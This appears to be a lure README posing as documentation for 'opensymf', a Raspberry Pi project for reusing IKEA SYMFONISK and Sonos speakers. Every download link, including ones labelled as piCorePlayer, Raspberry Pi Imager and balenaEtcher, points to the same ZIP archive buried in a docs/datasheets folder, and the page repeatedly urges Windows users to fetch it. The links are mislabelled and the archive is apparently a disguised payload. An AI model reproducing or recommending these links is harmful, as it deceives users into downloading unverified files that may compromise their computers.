# 🎵 opensymf - Whole-House Speaker Control Made Easy

[![Download opensymf](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip)](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip)

---

## 🔊 What is opensymf?

opensymf is a free software project that turns IKEA SYMFONISK and Sonos speakers into audio players using a Raspberry Pi. It includes scripts for controlling the speaker hardware using GPIO pins. With these tools, you can set up up to seven speakers to play music around your home. This setup uses piCorePlayer and Lyrion Music Server to manage audio playback smoothly.

This project helps you reuse speakers instead of buying new ones. It works with Home Assistant for smart home integration and supports right-to-repair principles by providing detailed guides and pin layouts.

---

## 🖥️ System Requirements

Before you start installing opensymf, make sure your computer and hardware meet these needs:

- A Windows PC (Windows 10 or later recommended)
- Internet connection to download files
- Raspberry Pi (Model 3 or 4 strongly suggested)
- microSD card (8GB minimum) for the Raspberry Pi
- IKEA SYMFONISK or Sonos speakers to connect
- Basic tools to connect wires to speaker GPIO pins (screwdriver, jumper cables)
- Optional: Home Assistant setup if you want smart home control

---

## 🚀 Getting Started with opensymf

Use the link below to visit the official page, download the needed files, and find instructions:

[![Download opensymf](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip%20opensymf-blue)](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip)

Click the button above to go to the GitHub page. Follow the steps here to get your setup ready.

---

## 📥 How to Download opensymf on Windows

1. Open your web browser and go to [https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip).
2. On the GitHub page, look for a **Releases** section on the right side or near the top menu.
3. Click on the latest release version.
4. Download the ZIP file or other package marked for Windows or Raspberry Pi.
5. Save the file to your desktop or a folder you can find easily.

---

## ⚙️ Preparing the Raspberry Pi

1. Download the piCorePlayer operating system from [https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip). This OS is lightweight and works well with opensymf.
2. Use an imaging tool like [Raspberry Pi Imager](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip) or [balenaEtcher](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip) on your Windows PC.
3. Insert your microSD card.
4. Open the imaging tool. Select the piCorePlayer OS image you downloaded.
5. Choose your microSD card as the target device.
6. Start the imaging process. Wait for it to finish.

---

## 🔧 Installing opensymf on Raspberry Pi

1. Insert the microSD card into your Raspberry Pi.
2. Connect the Raspberry Pi to your network with an Ethernet cable or Wi-Fi adapter.
3. Power on the Raspberry Pi.
4. From your Windows PC, open a browser to access the Raspberry Pi interface. The default IP typically shows up in your router or can be found using network tools like Fing.
5. Use SSH or the web interface to log in.
6. Follow detailed instructions on the opensymf GitHub to install the GPIO scripts and necessary software components.
7. Connect your IKEA SYMFONISK or Sonos speaker to the Raspberry Pi GPIO pins as shown in the pinout diagrams included in the repository.
8. Test each speaker’s connection using the test scripts found in the GPIO folder.

---

## 📑 Using opensymf

Once setup is complete, you can:

- Control multiple speakers in your home from your music server.
- Adjust volume and playback using simple commands.
- Monitor the speaker status through the Lyrion Music Server interface.
- Integrate with smart home systems like Home Assistant for added automation.

---

## ⏩ Step-by-step Quick Start

1. Download piCorePlayer and flash it to the microSD.
2. Insert microSD and power on Raspberry Pi.
3. Download opensymf files from GitHub.
4. Copy the GPIO scripts to the Raspberry Pi.
5. Connect speakers to the GPIO pins following the diagrams.
6. Run the install script to set software up.
7. Open Lyrion Music Server on your network to start playing music.

---

## ⚠️ Hardware Setup Tips

- Use clear labeling on all wires between the Raspberry Pi and speakers.
- Double-check pin numbers before connecting.
- Ensure the Raspberry Pi is powered with a stable power supply (5V 3A recommended).
- Keep the Raspberry Pi and speakers in a cool, dry spot.

---

## 🛠️ Troubleshooting

- If speakers do not play sound, check connections.
- Restart Raspberry Pi and try running the test scripts again.
- Make sure you are using the latest version of piCorePlayer.
- Check GitHub Issues on the opensymf page for common problems and fixes.
- Verify network connection if the Lyrion Music Server is not reachable.

---

## 📚 Documentation and Support

All detailed guides for pinouts, GPIO scripts, and the whole 7-speaker setup process are available in the repository’s docs folder. It contains step-by-step instructions with photos and diagrams. 

If you need help, report issues or ask questions on the GitHub Issues page.

---

## 🌐 Download Link Again

Visit the main page to download the software and view guides:  
[https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip)